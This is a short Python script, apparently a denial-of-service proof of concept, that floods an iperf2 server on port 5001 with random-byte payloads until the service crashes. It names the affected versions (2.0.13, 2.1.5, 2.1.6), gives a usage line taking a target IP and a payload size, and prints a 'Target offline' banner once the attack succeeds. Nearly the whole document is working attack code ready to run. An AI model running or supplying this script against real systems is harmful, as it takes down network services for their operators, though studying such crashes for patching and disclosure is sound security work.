#! /usr/bin/python3
'''
    This script should crash iperf2
    after 10 seconds or so,
    depending on the version.

    Tested against versions:

      - 2.0.13
      - 2.1.5
      - 2.1.6

    Usage: python3 iperf2-crash.py <TARGET IP> <PAYLOAD SIZE (bytes)>

'''
import socket
import binascii
import time
import sys
import os

# Set to True for way too much output you don't need
DEBUG = False

start_time = time.time()

while 1:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(.1)
    
    # encoded 'deadbeef' * 5 works for more recent versions as well
    #p1 = ("\x64\x65\x61\x64\x62\x65\x65\x66".encode() * (int(sys.argv[2])))
    p1 = os.urandom(int(sys.argv[2])) # 512 seems to work

    try:
        s.connect((sys.argv[1], 5001)) # TODO: Change to argparse
    except ConnectionRefusedError as e:
        print("Status: %s\n"  % e)
        print("* * * * * * * * * * * * * * * * * \n")
        print("* * *  Target offline   * * * * * \n")
        print("* * * * * * * * * * * * * * * * * \n")
        print("Total time: %s seconds\n" % round(time.time() - start_time, 2))
        sys.exit(0)

    try:
        if DEBUG:
            print("\n* * * * * *\n")
            print("*  DEBUG  *")
            print("\n* * * * * *\n")
            print("PAYLOAD: %s" % repr(binascii.b2a_hex(p1)))

        s.send(p1)
    except BrokenPipeError as e:
        print("Err: %s" % e)

    try:
        resp = s.recv(40024)

    except ConnectionResetError as e:
        if DEBUG:
            print("Err: %s" % e)
    except socket.timeout as e:
        if DEBUG:
            print("Err: %s" % e)

    s.close()
    
